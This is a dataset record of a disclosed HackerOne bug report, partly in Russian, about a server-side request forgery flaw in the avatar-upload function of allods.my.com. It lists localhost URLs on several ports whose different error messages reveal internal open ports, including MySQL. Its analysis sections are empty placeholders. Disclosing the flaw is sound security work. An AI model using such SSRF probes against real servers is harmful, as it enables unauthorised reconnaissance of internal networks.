---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '111950'
original_report_id: '111950'
title: '[allods.my.com] SSRF / XSPA'
team_handle: mailru
created_at: '2016-01-20T22:42:24.135Z'
disclosed_at: '2016-02-11T15:19:22.430Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
---

# [allods.my.com] SSRF / XSPA

## Metadata

- HackerOne Report ID: 111950
- Weakness: 
- Program: mailru
- Disclosed At: 2016-02-11T15:19:22.430Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Доброго времени суток.
Уязвимость находится в функции загрузки аватара. Можно загрузить аватарку с удаленного хоста.

PoC

http://allods.my.com/forum/index.php?form=AvatarEdit

Download avatar: 

http://localhost:80       - You have selected a corrupt image.  (порт открыт)
http://localhost:3306  - You have selected a corrupt image. (порт открыт) (с внешки mysql не видно)

http://localhost:1337     - The file download has failed. The entered url might be incorrect. (порт закрыт)
http://localhost:31337   - The file download has failed. The entered url might be incorrect. (порт закрыт)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
